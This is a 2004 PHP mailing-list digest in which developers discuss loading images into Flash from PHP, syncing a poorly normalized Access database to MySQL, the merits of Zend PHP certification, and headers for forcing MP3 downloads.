If it's only 5 images you could use loadVariables:
http://www.macromedia.com/support/flash/action_scripts/actionscript_dictiona
ry/actionscript_dictionary425.html

And output the image names in a php script something like:
&image_url=http://www.example.com/images/&image1=image_1.jpg&image2=image_2.
jpg&image3=image_3.jpg&image4=image_4.jpg&image5=image_5.jpg

Then once the image names (and location) are loaded into the movie, you can
use loadMovie to load that actual images into your swf:
http://www.kirupa.com/developer/mx/loading.htm

If you plan on sending more stuff from your php backend, I'd recommend
looking into learning about using xml with flash.  Then you would just
output the vars into an xml format and let flash do it's xml magic (it can
be a feat to learn at first, but very powerful once you 'get it').
http://www.macromedia.com/devnet/mx/flash/articles/tools_xmlobject.html

Basically, there's a lot more to learn on the flash side than on the php
side.  PHP would be your gateway to the data and format it whichever way
flash needs to read it.  All the real magic would be in flash itself.

Good luck!

Mark

Subject: [nycphp-talk] DB Differences
Message-ID: <20040618084058.8E851A85EA@virtu.nyphp.org>

Looking for a professional developer's opinion...

I'm working on a gig where I'll be importing data on a nightly basis from an
already existing access database (mdb).  Their setup is Access / CF Express.
I'm, of course, working on a LAMPhp server as I usually do.  Eventually I'll
also be exporting back to that database.  

Now, looking over the db, I don't agree with the overall design.  It's not
normalized very well.  I can't necessarily tell him to change it, 1 -
because that's not what I'm hired to do, 2 - because it's his app and he'll
write it how he pleases.  But, I can't see myself replicating their
structure to run my application.

Obviously this will cause more headaches in the sync functions.

So, would you replicate his db and grin and bare it all, or would you format
it the way you feel is 'right' and efficient and holy and just deal with the
data conversion with every import / export?

I'd appreciate any input, if at least to help me with my own sanity.

Ok.. Last one for the morning.. then I have to get back to work.

Early last year when work was scarce, I'd been working on a tool that I
believe may be incredibly similar to clew.  I got pretty far with it and
then left it to form rust while I found a few opportunities to make my
landlord happy.  I'm not sure that I'd have many reusable components from it
(although if I look, I just might), but I do have thousands of ideas about
it. Anyways, I was wondering how I might be able to join in the fun.

Is your (sub)system the 'dog' or the 'tail' and which of the 
two systems should do the 'wagging'?

Is this a 'webification' of something which has a good 
'track record' in terms of volume? Do you feel that 
the volume of your system, in terms of users and/or transactions, 
is likely to increase past the size of the 'tried and true' 
system -- and to the point where incurring anomalies in 
the transactions will be more probable than that in the other 
system because of the poor schema?

The above is just food for thought.

I would venture to say that the mismatch between your understanding 
and your client's understanding of database design will be more 
likely to cause 'headaches in the sync functions' than the 
mismatch between the two database schemas.

Access has some data analysis routine that you can 
run on a database. (Sorry, I forget specifically how 
you run it -- you go down one of the 'menu mazes' that 
Microsoft developers are fond of including in their products)

You could play with some data in a test mdb and 
see what the 'data analyzer' suggests. 

As I recall the process gives some suggestions on 
how to improve a database's schema and gives 
examples of data normalization and why those 
normalizations are important.

I am a little fuzzy about to what degree the 'analysis' 
is affected by the data in the tables, but I seem to 
recall that there is a fairly strong relationship.

A possible tack you could take is to 'stack the 
deck' in a test mdb database -- that is, put data 
into the test database which will make the analyzer 
thing suggest what you feel is the right move.
And then show this to the client -- and even 
let him play with the analyzer a bit.

This might bring his understanding to more 
clearly match yours.

It is my experience that it is most difficult, if 
not impossible, to 'teach' someone something; 
the most you can do is provide an environment 
for people to 'put the pieces together' for 
themselves and hope for the best.

Their mess should not be your problem ... if you can write a small, quick, efficient odbc 
filter that you can generically use that might help especially since it would not break 
your design or your clients.  There should be a way for you to setup your tables the way 
you would be comfortable in dealing with them and then look and see how youd like to get 
data, a job I was on would pipe csv back and forth with a filter in between.  

There is also a small tool called MdbToMySQL (freeware) you can try ...

Ok, details required :)

It's a grading system written in access, being used by teachers via cf
express.  So current usage is about 5 - 10 people.  The web version will be
accessed by a couple hundred parents.  Obviously not any feat in traffic,
but the design is always important.

I'm actually in no position to change the 'parent' db (the access db), as
it's an application completely in use that I have no say in the maintenance
of.  I definitely would, and the improvements I have in mind are strictly
based on general experience in db efficiency and .. Well.. nice queries.

Here's an example table
Grade_id
Stud_id
S_first_name
S_last_name
Criteria_num (number of criterias used for this grade)
Crit_1_name
Crit_1_value
Crit_1_percentage
Crit_2_name
Crit_2_value
Crit_2_percentage
Crit_3_name
Crit_3_value
Crit_3_percentage
... (up to 12)

All the math I'll be doing with this setup will require me to grab all the
data and do some string manipulation for column names.  If I made a criteria
table with a grade_id (fk), I could do all the math in the query and knock
out 5 steps as well as keep everything far more efficient.  Also, having a
student name here and in a students table makes it easier to lose track of
one or the other.  Every change requires a change in 2 places.

Well, this is the primary dilemma.  Do I design the db 'my way' and make the
sync really nasty, while potentially offending the original developer -
while building a nice and easy to maintain site, or do I do it his way
trying to keep up with overlapping records and workarounds.

After typing all this out, I'm pretty sure I'll end up doing the db my way,
I was just wondering about the opinions of other pros out there.  If
anything I know the way I design my systems is tried and true enough for
these guys to seek me out in the first place.  Once the clock strikes 4am
such decisions can get a bit fuzzier.  So thank you all, if at least for
receiving this...

Thanks for the thought out reply, Tim, and I'll make sure to mention the db
analyzer to my client.  Good thinkin!

No need to have the exact same structure on another database. Use what's 
best for the situation, and no need to change the original.

Well, with something like this, I would expect to keep the client's design
on my end as well, which I'm really trying not to work with throughout the
site.

I couldn't agree more, but that's the dilemma

The reason I feel the sync would get ugly is because I'll be splitting
tables into 2 or 3 tables.  So should they make a change to the data, I'll
need to create a means for each record to know where it came from.  My table
will have Id's that have nothing to do with their data.  Which brings me to
the finale...

Indeed absolutely.  The more I think about it, the more obvious it gets.
Put the work into the translation, keep the site clean and neat.

Again, thank you all...

As long as the client's data model isn't subject to change on a whim, 
you should be fine.

Keep in mind that you might need to justify the alternative structure (I 
mean, I'd be pissed if you just went off on your own and ignored my 
model but that's just me). There are plenty of obvious differences 
between Access and MySQL, though, so you can probably explain it away as 
"optimization".

Which it is.

Message-ID: <40D2E3F2.7090109@chxo.com>

How do people feel about "official" certification as a qualified PHP 
programmer?

My knee-jerk reaction is to rail against this sort of thing as a 
devaluation of the art of individual expression in programming, but I 
realize that it could create a strong incentive for all of us to make 
sure we're up to speed on the "phundamentals".

This could be particularly useful when coming to PHP from languages with 
different programming conventions, like Java or TCL, or for coders in 
one or two person shops where the style is homegrown. I've seen plenty 
of code that would never have been written had the author been aware of 
some common best practices.

I hope NYPHP will offer training (online and off) to pass certification 
if the community embraces it -- would anyone be interested in such a 
thing, either for themselves or their colleagues?

I generally avoid certs and people who chase them, but that's based on a
bias from a few  years ago as a manager for a software company hiring to
fill technical positions.   Guys with 4 or 5 networking and hardware certs
who couldn't change a NIC properly and got that scared look in their eye
from a 10 node network diagram.

Otherwise, I think having a certification of knowledge isn't necessarily a
bad thing as long as it's granted properly.

Nonetheless, I'd sooner hire someone I would be happy to have a few drinks
with while chatting about coding methodologies and music than someone waving
a signed and stamped cert in my face as proof of experience.

You certainly can, but it means that you still have to create the 
initial flash animation to work as a container for your graphics.

What is common today is to create a flash animation that fetches images 
(or other movies, or even HTML content) from a remote page - this page 
is a PHP script, and can use arbitrary methods (like session 
identification) to decide what dynamic content to send to the flash 
animation.

What you are doing is pulling the content *out* of the flash animation, 
and including it as a remote object with actionscript (flash's 
proprietary scripting language).  So you still need to be able to create 
the initial flash animation that pulls all the remote media.

I'm deep in the bowels of a site that uses flash as a container for all 
content, and all content is dynamically generated by PHP.  When I am 
done I will be writing article after article after article... ;)

I can definitely see myself in the "homegrown" category, and as I'm coming
to a place where I'm trying to involve a couple more programmers in existing
projects, I'm just *hoping* none of my potential coding partners will say
"gee, this code never would have been written had ALLEN been aware of some
common best practices."

Interested in training for the certification? Yep.

I come to this as the eternal wannabe -- the guy with a nominally
non-technical day job who loves coding -- but I have considered this
question in another domain, namely court interpreting. We Spanish
interpreters in the U.S. federal courts take an appropriately challenging
exam to see if our skills and knowledge meet the level required to do the
job responsibly and competently. No exam is perfect, false positives and
false negatives happen. But certification by a reasonably valid and
reliable process makes a nice complement to whatever else the
certification-holder brings to the table. There are tasks you wouldn't
want performed by anyone who didn't have some official credential
attesting to a miminum level of competence -- airline pilot, etc. I think
the net value of certification processes is positive.

I would go for the PHP certification exam in a heartbeat but first I would
want to have a chance to learn as much as possible about it and
"self-study" for it the way I did with Sun's Java programmer certification
(go ahead and jeer). I'd like to know: how many questions there are; the
format of the questions; the time limit; the minimum passing score. And
I'd like to put myself through some practice self-tests. Yes I recognize
that the exam is still being developed. But I'm not eager to pay $80 to
sit for the beta on such short notice.

The announcement speaks of "chapters" where one normally calls them exam
"objectives" or some such.  Are they planning to publish an exam prep
book?

Don't forget about the other side of the coin.  I know as a programmer I
tend to only think of the technical ramifications, but you also need to look
at the business ramifications ( ie. what will make you the most amount that
the customer is willing to bear )

So, let's think of a straight sync.  It will take you longer to create the
queries/post query parser to obtain the data for your screens.  Multipy that
by how many queries.  And of course time is money.

Then a translating sync.  It will take longer to write the sync, but the
queries will be real easy and no need for post query parsing.

Let's assume the longer time of the two is with a straight sync.  So, if you
can get approval for the time estimate for the straight sync, you can then
safely choose either method, if you go with the programmers ideal and
translate the sync, you may win out and come in under budget which either
saves the client money( always good PR ) on an hourly, or makes you more
money on a fixed.

Then say the client won't go for the longer time frame.  You can then
suggest that a programming ideal can lead to a shorter time( that is of
course if the translating is less dev time ) and thus save them money, but
it may come at the expense of a more complicated sync and therefore may be
more costly to maintain.

Now flip it, translating takes longer, but the client is willing to bear the
cost, you can either stick with the plan and have the knowledge that the
program is the best you can produce, or you can short cut, do the straight
sync and dirty programming and either come out the under budget hero or a
little richer.

But if the client won't bear the longer translating cost, you go the
straight and dirty and know that although the program is not one you will
present as "see what I can do", it is one which you were more sensitive to
your client and win a few business brownie points.

Hope this helps,
Jim

I think this is one of the major bases for my indecision.  If the client
would prefer the straight sync, I may just turn down the gig.  I have a very
hard time putting out code and asking people to pay for it if I don't feel
it's done to the best of my ability with my full approval (or at least a
good 85% approval due to compromise).  Even when I was growing tired of the
refried-beans-every-damned-day diet, I wouldn't compromise my product for a
check.  I'm sure such pride can be a downfall, but I feel it's one of the
major reasons I have so much work now.

i think the certs are fair and justifiable, not only that but failing them proves to be 
quite educational beleive it or not, i learned more from failing the 1st sun java cert, 
alot that i never went back to take it again (half regretable).  call it cheap man's

2. What would be the syntax for oracle connect statements (plz point me to a

How about a developer/development project director's opinion?

Based on my (somewhat cynical view of ) experience dealing with people 
who have a "good Access database" and "need someone to put it onto the web":

- they will not listen to your reasons for changing the Access database 
at this time.
- they will not learn "in real time" from your own database design/work
- they *will* likely change their own schema at some point (because they 
will learn and improve - and while it may be an improvement, it will not 
match yours)

So if these are likely, you really need to abstract your interface to 
their data and make a clear specification for what they will have to 
provide to you for updates. If you get to do this unilaterally, good for 
you. Get that spec approved in writing so everyone has an obligation to 
meet it (otherwise they may decide to change it and simply expect you to 
accommodate the changes).

Define a CSV or whatever that works for their schema now, and is solid 
for your use. Require a full dump for their export every time, so you 
don't need to worry as much about data integrity. This is a good time to 
design your app and process to be modular such that it is recoverable 
from a full data set from their end plus a diff or sync set from your 
end, with no need to have your database backup on hand (just the diff or 
sync set)..  Think ahead and require compression now, so if the file 
gets large nothing breaks.

Your apps should accomodate updates via proper table structure *on your 
side*, so that the full dump gets parsed *by you* and your own tables 
accommodate syncing your stuff with their stuff. 

Ideally, your database and process is robust enough to restart fresh on 
a new system using only 1) a full dump they provide and 2) an 
import/sync set from your side. If you achieve that, you can then 
offload archive responsibility to their admin as well, by simply 
delivering the sync set at any time for him to archive along with a copy 
of the process and a copy of his full dump CSV.

If I were you I would create some one-way hash functions to run their 
dataset which I would run prior to every import, so that any changes at 
all (historical data, field names, eve spelling and or capitalizations) 
are flagged and the generated repor tis made available to both sides. Of 
course I would make sure my archive/diff set passed those same data 
integrity checks as well ;-)

I'm in a similar situation with one of my clients right now.  It is a 
complex financial site that gets daily feeds from a third party data 
provider.  Normally I'd enjoy this kind of work, but the politics of the 
situation mean that instead of getting direct flatfile exports from the 
provider, I have to wait on someone at the client to manually pull the 
same data down into (gasp!) excel spreadsheets (gasp! gasp!)

This data is complete bollocks.  Mismatched fields, constantly-changing 
formats, bogus values, you name it.  (CENSORED)

So I have written a PHP script (fired off by cron every night) that does 
all the work for me.  It was quite some effort building in all of the 
error checking and format conversions, but it was an excellent 
opportunity for me to work with PHP on the command line and also get 
some badly-needed experimentation with classes and objects.

So instead of being unhappy, I'm happy and just a little more edumucated ;)

Plus my database is in PostgreSQL (a manly-man's database), and I can 
have whatever schema I want as a result of the load script running 
'interference' between the two disparate datasources.  That is, if you 
could qualify Excel a 'datasource'!

Keep this in mind - although importing with a direct loading utility 
(like mysqlloader or whatever) is the best bet - and easily the best 
performing of the bunch - you may need more that just direct loading.  
It may be more important to have error checking and controls in place to 
ensure that your application does not fall prey to the "garbage in, 
garbage out" disease.  This would also give you the insurance that 
having a separate schema for your app will not cause discomfort with the 
original application, as you now have the chance to do some data 
transformation.  Besides, you certainly want to have some sort of error 
checking so you aren't left with an empty database if the automated load 
fails, right?

Also, a plug on ADOdb's XML data transformation services is in order, as 
you may have yourself the perfect opportunity to use this fascinating 
library...

    http://phplens.com/lens/adodb/docs-datadict.htm

I'm hoping to use it in Mambo Open Source 5.0, which will sport ADOdb 
under the hood and needs to support cross-platform database creation at 
install time...

If the original developer is still around Id have a sit down with him/her and explain the 
huge benefits or having a seperate criteria table ... then work around what you would 
like to accomplish with him/her in terms of accuratley syncing (btw, do you need to 
actually "sync" @ all - from what I recall you could use PEARDB w/ odbc and adjust your 
SQL accordingly) ... some however question its reliability I beleive :-\

Hehe.. The point is, that a good conversation in a comfortable environment
can tell you quite a bit about a person.  Of course having the work and
references to show experience is key, but you can learn a great deal about a
person's ability to communicate with you, your clients and with themselves
in every day conversation.  You can also get a good feel for how open they
are to ideas and how rational they are.

The honesty from the conversation away from the interview will generally let
you know how compatible you and your team will be with them as well,
considering you may end up spending more time with them than you do with
significant others.

> i think the certs are fair and justifiable,

And I agree, especially with the earlier example, which sounded like a great
implementation.  If it's done well, then it's well worth it.

Well then, the real question is if the client needs to know how you do the
job.  I don't provide internal code/db design info to my clients, just the
interface design and overal nutshell process design.  This means on the
project your dealing with I would tell them process wise we have some kind
of sync process to put the access data into a db that's workable from the
web and then the website processes for the parents to be validated etc &
query the data. I wouldn't inform the client that the DB may not be the same
design as the DB they are providing.  If the DB for the website is static
( ie. no updates except through the sync ) then I would provide the client
the option to do a dump rather than sync.  This eliminates all the
complexity of determining what has changed etc.  Then your translator is
very straight forward.

>From the business perspective it would be interesting to find out how many
developers have provably gained more work because they refuse work which
would require too much developer design compromise.  My own experience has
been with companies that take work no matter the development compromise, the
only deciding factor on accepting projects were money.  Now that I'm
independent, I have turned down work based on a refusal to compromise,
although my willingness to compromise has become greater as I deal with the
desire to put food on the table for my family.

BTW, I'm a developer through and through.  I have been running my own
consultancy for 3 years and still don't call myself a businessman.  I'm
independant not because I want to be but because I lost my job right at the
end of the .com bomb and the beginning of IT hell and the job market was
drier than a cracker in the Sahara during a 30 year draught.  Thus said, I
am always looking for business based opinions of others and am very willing
to adjust my business view  accordingly.

More incredible points.  This whole thread has opened my eyes quite a bit to
the politics of application synching in general, as to ensuring all changes
are planned, spec'd and a process is put into writing ensuring both data
structures will continue to work together through future maintenance on both
ends.  

I've always put a great deal of time into planning and ensuring everything's
signed off on before my first '<?php' is typed, but mostly as a means of
ensuring an avoidance of scope creep and miscommunication.  Gotta love some
good perspective.

You're all kings, and +1 beer for the lot of ya (I mean it, be sure to hold

I try to keep all my work and plans as up front as possible with the client
(as long as they want to hear it, of course).  As an independent, I'm sure
you know very well that there can quite well be another new contract
developer going over this in a few months should I be busy or out of town.
When that developer comes to the app and finds 2 completely different
databases and a massive data processing script, the client can explain what,
where, and why, instead of the new developer trying to talk the client into
a complete rewrite because the 'last guy didn't know what he was doing.'

Then when I get back from my PHP cruise or whatnot, instead of having 15
emails questioning my methods, I can just delete all my spam infested
inboxes and settle in.

If the conversion ends up being some serious muckery, I may end up going the
dump route entirely, although I'm sure I'll be able to convert the data
accordingly with some good planning.

I would be ... for one the thing I feel that "messes things up" when it 
comes to both certification and the process of learning any programming 
language is both the books and resources that cover it and sometimes the 
language itself ... 

There are alot of security areas where it just seems like certain things 
should just "happen automatically" yet you cant dictate how someone should 
be able to code/style it ... and nearly every book has a different way to 
go about it ...

<rant>
Here is one example - page 285, PHP Developer cookbook:

It shows that EscapeShellCmd() should pretty much *always* be used when 
forking a process to read from ... yet its not something built-in nor 
shown in the example but is merely "stressed" as being important ...

Thies Arntzen once said:
"I could teach PHP to a monkey, if I had enough bananas." 

One of the main advantages of PHP is that it 
is a small and 'intellectually manageable' language.

You can get a pretty good grasp of PHP, the language, 
in an afternoon -- if you come from another programming 
discipline (C++, Java, etc.)

But PHP doesn't operate in a vacuum -- 
it works together with an operating system, 
a web server, and more often than not with 
a database (and that's not including permutations 
with PHP as a CLI)

When it operates like this PHP is much more 
than a language. When PHP works with the other 
components, it becomes a framework.

That's why at NYPHP we have this concept of 
'AMP' (Apache MySQL PHP) training -- i.e. 
PHP doesn't operate in a vacuum.

To digress for a moment, this would probably be 
a lot clearer if someone (me) had done a 
better job explaining the training on the 
pages of NYPHP's website.

(I could use some help here. I invite all 
interested parties to drop a line to:

Michael Southwell
VP, Education Department
NYPHP
michael.southwell at nyphp.org

and request membership to the Education 
Department mailing list.

This is a golden opportunity to help shape 
not just the web pages at NYPHP -- but 
to work together on forging the future curriculum 
at NYPHP. 

Since I am digressing, let me also say 
you don't have to have an advanced degree in 
education or be a PHP guru to help.

Everybody on this list has an area of 
expertise, which can greatly help our 
effort -- so please consider this: 
You can make a *BIG* difference in the PHP 
community and help it to grow, if you decide 
that is something you want)

Back to the original topic (PHP certification), 
what is meant by PHP certification?

If it means you know the language, then 
it strikes me that it wouldn't be to 
valuable (that is, of course, if you take it 
as a given that you could learn the language 
in an afternoon).

Now if PHP certification means that you know 
all that stuff (the twelve chapters) which 
was included in the post about Zend 
certification, then I have some thoughts on that.

One, it seems to ambitious.
I don't see how you could cover all that 
ground in even a hundred questions on an 
exam -- of course I haven't seen the book 
or the test, so perhaps I am just badly 
informed here -- much less seventy questions.

Two, it seems uneven.
It might be better to have a volume on 
PHP with databases, and a volume about 
PHP with XML -- instead of all in one 
book.

Basically, the NYPHP focus is going to 
be on AMP certifications (and even there, that 
might be too broad -- i.e. perhaps it should 
be broken into WAMP, XAMP, and LAMP)

If you don't agree, join the Education 
Department. We work by consensus -- 
your voice will be heard.

Jon,

The database questions are generic as you said and will not be tide to
any specific database.

As for Pear, there are no questions. The authors of the exam didn't
feel that knowing PHP means knowing Pear.

I think that should do everything you need.  Anytime I do something 
stupid like connect an event that a widget doesn't listen for I get PHP 
errors not some other type of error.  I think the PHP-GTK team was 
pretty good about making sure that all GTK errors were handled with PHP.

I'd like to weigh in here because I'm in a position to have my job pay 
for training and have been wondering for a while when the TBA's on the 
training ramp cert. page were going to become actual dates.  I think the 
best thing I can contribute to the conversation is a summary of what I'd 
like to get out of some PHP +related training.

First of all I came to PHP (and web stuff in general) via photography, 
design, cooking, biology etc.  So, I started using PHP because it's easy 
to to a lot of things.  But, basically I don't know what I'm doing and 
have been floundering around for a while wondering how to get my 
bearings when there are so many other (better IMHO) ways to spend time 
than in front of a computer.

That said.  I would like to gain a more solid understanding of the 
fundamentals of the language itself.  As well as enough familiarity with 
the other parts of the 'framework' to be confident that I am proceeding 
with a project in a way that makes sense instead of going off on a 
tangent (which is easy when there are so many alternative ways to go 
about a task).

As an employee at a medium-sized university I will never be 
administering the servers or compiling the PHP, but I would like to know 
enough about Apache etc. to be able to confidently interact with the IT 
dept that does (eg lobby for a new mod in PHP, or not be so in the dark 
(where they like to keep people) about the environment I'm trying to 
work in).

I should shut up now.  But as far as certification goes I don't care 
about certification (and I totally agree that casual conversation can 
speak volumes about a potential employee) but if I can learn more about 
the things I'd like to know and get a certification to show to the 
people out there who do care about certifications, then so much the better.

Hope that's somewhat helpful from one potential student's perspective.
And, I hope you figure all this out soon so I can come down and take 
some classes soon...

Dave

Subject: [nycphp-talk] header to force helper app for MP3 file
Message-ID: <BCF8868A.20F59%stephen@musgrave.org>


from browser to browser, platform to platform, there are varying scenarios
that a user is put through when clicking on an MP3 file.  on my mac a new
page opens with quicktime embedded in the middle and the file plays.  on one
PC that it was tested on, windows media player launched.

i've tried to use various header directives which cause, again, varying user
experiences a couple that i have tried include:

- - - - - - - - 

header('Content-Type: application/mpeg');
readfile($filename);

- - - - - - - - 

header('Content-Type: audio/mpeg');
readfile($filename);

- - - - - - - - 

header('Content-Type: audio/x-mpegurl');
readfile($filename);

- - - - - - - - 

i want the user's helper application for mp3s to launch.  if there isn't one
defined, they should be prompted to decide to choose one or download.

any tried and true method?

thanks much : stephen

Stephen,
To force the browser to show the Open/Save dialog box, in addition to the
Content-Type header you should send the Content-disposition header:
'Content-disposition: attachment; filename=filename.mp3'

Cheers,

I'd like to ask the question "Why does Zend want to offer Certification?"

I think the answer to that may be telling.

Hi John,

I the first message of this thread:
"As the PHP company, Zend has been approached by many asking it to
establish an industry standard that recognizes PHP expertise. In order
to do that Zend has partnered with PHP experts worldwide to create the
Zend PHP certification exam. The Zend PHP Education Advisory Board has
specified a curriculum essential to demonstrate expert proficiency in
PHP."

Thanks Daniel, I knew I read that soemwhere recently :-)

What I mean to say is who is the "many" that have approached Zend about 
offering such an industry standard? What I am looking for is the 
motivation beyond the establishment of a standard and a certification. I 
understand many of the motivation(s) behind M$ certification; I 
understand the motivation behind the CCNE certification (although I am a 
bit puzzled by the CNA one ;-)

Thanks alot.

We are still struggling to get our AMPeers project (

lost its project manager, but when we do, I hope you'll consider sending 
one or more of those our way.

I agree that Ming is a useful extension for this yet when you want to get
something done right you often need to turn to the manufacture to get truly
managable and scalable results. I'm not sure what your clients budget or
timeline is and not this is just a suggestion.

I have found it extremly time consuming in the past to use Flash and PHP
conbined when building RIA. Note:  PHP multimedia this is book might just be
a good source of needed info for you.

If you have the money and time, oh and (I'm gonna duck now) Java knowledge.
Macromedia Flex has become my choice for authoring these types of
applicatons.

The "many" are Zend clients, PHP community members, PHP core
developers, and the enterprise using PHP. I have spoken with many at
conferences and expos and have seen a great interest in such a
program. There are hundreds of small training centers in the US and
Europe that teach PHP, they too would like a PHP Certification that
could give credibility to their courses.

An interesting thread:

You got that right.

The NYPHP certification (for admission) process seems 
to me to pretty much adhere to the following pattern:

Members retire to a nearby watering hole after a meeting.

All in attendance have four or five drinks.

A prospective member is questioned on his opinion about 
some aspect of PHP.

If the member doesn't slur his words, he passes.
If he or she manages to work in a funny story the person 
passes the 'oral test' with honors.

You could try to force "Content-Disposition: attachement" to see if it has 
any affect (as it should).  

I think some other options might include playing around with 
browscap/phpsniff w/ http_accept and creating a test page.

As far as I remember you cant get a list of helper apps that are 
associated with the client server side.  If you can check the plugins that 
are enabled you can leave it to download + the client would normally 
decide on the helper app for that MIME type.

Well, that function is indeed built-in. As for there being best practices
regarding security, there are. I've discussed such things in many places,
and I can't recall a single person ever arguing with me. If my suggestions
were the least bit controversial, I would expect to have to defend my
statements more often.

Also, most security-conscious people I know avoid shell commands at all
costs. I always hate writing about command injection and such, because I
really want to say, "don't do it."

Rants lose a lot of their force when you're making guesses about what it
is you're ranting about. The certification is on PHP, although I'm sure
everyone would agree that there is a certain fundamental foundation you
would want a PHP developer to possess regarding databases if you were
hiring. Some generic database questions should be expected.

Thanks. I read through them.

I have always felt it was a manager's obligation to be knowledgable 
enough to screen a candidate on basic mastery - or find someone who can. 
What does a certification program do aside from providing an avenue for 
structured training, a revenue stream for an educational institution,  
or a channel into which a vendor can sell product? (not that those are 
bad things, but they are not necessarily in the best interests of the 
php  programmer).

I suspect I would consider it a good thing if it was a high hurdle 
celebration of true mastery, but not if it was just another 
pay-your-dues-and-get-your-certificate program.

Yeah, everyone would expect a 'Certified' PHP developer to have  
some knowledge of database fundamentals. But then again you would 
expect any developer to have at least a passing acquaintance 
with a database.

I believe industry figures put the number at eighty-something
(maybe 87) percent of all applications use a database.

Now if I were a project leader on a PHP project using MySQL, 
and I had two candidates for a position on my team -- 
one who had used MySQL for two years with PHP, 
and another candidate who had never made even one 
mysql_connect with PHP, but had 3 years experience 
as junior data architect helping design a Sybase database -- 
I don't think it would take me long to decide.

The beauty of PHP is that it is very transparent. 
I could, almost undoubtedly, more easily show the 
Sybase guy how to use PHP to take advantage of what 
he has picked up along the way about referential integrity, 
than to try and work with the PHP guy (assuming the PHP 
guy's database experience consists of just doing many 
different variations of sql selects -- 
which may be fairly likely in my view).

I have a problem with PHP certification because, in 
my mind, there's no such thing -- PHP doesn't 
operate in a vacuum.

It's RPC, database integrity, XML, interprocess 
communication, etc. -- those are the 'sticky wickets' -- 
not PHP. If someone knows all that stuff, then I think 
he would be more correctly termed a certified web 
developer -- not a certified PHP developer.

Maybe you could certify someone in a reduced 
skill set space like PHP running together with Apache -- 
but there you'd be getting closer to the AMP style 
certification and away from the ZEND idea of certification.

Tim,
This is a very interesting thread and it is great to hear all the
different ideas and thoughts on certification in general and PHP in
specific. I especially liked Jon's "failing them proves to be quite
educational believe it or not" :)

I would like to respond to the last three word in your last paragraph:
"ZEND idea of certification". Although this is definitely Zend's idea
of certification, it is also the idea of a very respected group that
helped make PHP what it is today whether they be core developers,
library developers, book authors, educators, or evangelists (list in
no particular order). These people have worked very hard and have done
an amazing job. IMHO their creation is the best tool available today
that can demonstrate expert proficiency in PHP.

Of course being certified isn't a substitute for a job interview, a
personally check, or even another written PHP test. It is another tool
to help the enterprise in the hiring process and to help the PHP
community in showing their expertise. It also isn't a
one-size-fits-all solution for every PHP developer, but most I am sure
feel that is something the PHP community needs - now!

Best,
Daniel

conviction = = good

buuuuuuut... I'm not sure how much the content of this thread truthfully 
agrees with it.

Chris said "there is a certain fundamental foundation you would want a PHP developer to possess regarding databases if you were
hiring. Some generic database questions should be expected."

and I think that's a goodpoint, that could use some clarification. Im my view a question about mysql_connect is unworthy on a PHP certification test. A question on PHP security, that uses a mysql_connect example, now that's a good question! 

Ditto for what Chris calls "generic database questions". As Tim highlighted, PHP doesn't operate in a vacuum. If there's one consistent criticism I see in the world about PHP, it's that PHP programmers try to use PHP to do things that are best done with other partners in the server or application space. Now an evangelist can argue how PHP can rightfully be extended to do those things, but do we want to breed developers to do things the PHP way even when they are not best practice (except in the PHP evangelist world?). I recognize that is a very tough question to answer. I also recognize that as PHP matures, it extends into those fringe areas and can even take them over. Kudos for PHP development, but I don't follow PHP evangelism blindly for risk of losing the practical expertise that I believe made my PHP work so important.

In many cases "PHP is the best choice" is very true. Around the fringe, I feel it should be "I choose to do that in PHP" and the choice should be based on wisdom; it must be aware of the pros and cons. A certification process that operates in a vacuum will do everything in PHP and test PHP knowledge and skills (kinda like the M$ certification). A real-world certification needs to address the pros and cons, foster an awareness of the interactions with partner and sister systems, and test competance on working in the mixed mode environment (working in it using PHP, for a PHP certification). That is what RHCE *ws* (before RH8 imho) and that's what CCNE was and still is imho. I have some killer "PHPand MySQL" books, but I don't have any good PHP books that do more than gloss over the database functionality in PHP, probably because the editors made the same assumptions (it's not a book about databases). 
 
So I believe it is short sighted to say it's a PHP certification and not a db certification as a way to justify incorporating coverage of php database commands and not databases in depth. If it's a PHP certification test, it may be very true that you need to know alot about databases in order to pass a worthwhile PHP certification exam. Maybe for non-database PHP'ers, that will be the part of the test where they get 55% wrong and still get an 80% grade for the overall PHP certification test and pass.

I am reminded of the Profesional Engineering Society exams. 8 hours of grueling engineering exams to get a Professional Engineering "License". Even if you're a Civil Engineer with 15 years of experience building bridges and skyscrapers, you will have a section on digital circuit design theory, or perhaps chemical engineering. Go ahead, get them all wrong, but then you better make sure your Civil Engineering part is perfect if you want to pass the exam. It just a fact of life that you will have to know something about these partner areas to be competent in the real world. Shouldn't "certification" be the proof of that competence?

My $0.03.. thanks for the very interesting and thought-provoking thread.

I would agree with you that is not solely Zend's idea 
of certification -- there are indeed many people who have 
done a *lot* for PHP who agree there should be some sort of 
standard set for being a PHP programmer.

But what I am saying is that I find it hard to put 
much stock in the value of a certification for a 
simple language which can be learned in an afternoon -- 
it doesn't make any sense.

The language is great. I love it. But it is just a tool.

Take for example public accountants. They are probably 
the most well known case of being certified to do something 
(at least for U.S businessmen who would hire an account 
or an accounting firm)-- CPA stands for Certified Public Accountant.
It means that the accountant is certified to have a 
knowledge of generally accepted accounting procedures. 

Off the top of my head I would guess more than ninety 
percent of CPA's use Microsoft Excel as their spreadsheet 
of choice. Further, almost without exception, all 
Excel users know much of the little language that 
drives Excel spreadsheets 

In that little language you have all the familiar 
building blocks of a programming language:

variables, built-in functions, formulas (which 
are somewhat comparable to procedures), 
operators (with precedence that can be overridden 
by the use of parenthesis), libraries of routines, 
conditional execution constructs such as: if - else if, 
odbc connections -- even templates to 
help separate presentation from content 
(the analogy here to php is almost scary).

I have never seen an accountant's business card 
that says: 'Microsoft Excel Certified'

Now would you have the web development community 
believe that it would be of value to have 
something like: 'ZEND Certified in PHP' 
(or something to that effect) on *their* 
business cards?

Further, you make it sound like anybody who is 
anybody in the PHP world is behind this initiative.

Don't you admit that are in fact many 'somebodies' 
in the PHP world who are rather noticeably silent 
on this thing?

Some proponents for Perl certification described 
the vote at an OSCON meeting as being 100 to 7 
in favor of certification.

The reality is that half of the people to whom 
the vote was put were 'noticeably silent' in that 
they abstained from voting.
 
http://teachmeperl.com/perlcert/OSCON_vote.html

Of course this 'noticeable silence' (in both 
situations) is open to interpretation.

Very interesting thread.
I thought I'd throw some more gas on the fire.

First of all, there is no "correct" answer to the question of what value 
does passing the test have,
At the end of the day, a PHP certification (from Zend) is just that - a 
PHP certification from Zend.
It's a piece of paper that says you passed a specific score on a 
specific test.

I don't see how this is any different from any other test based 
certification.
Sun has Java certification. MS has theirs.
I'd go as far as saying that even an academic degree is nothing more 
than a piece of paper. What value does a computer science degree have?
 
As the saying goes - beauty is in the eyes of the beholder.
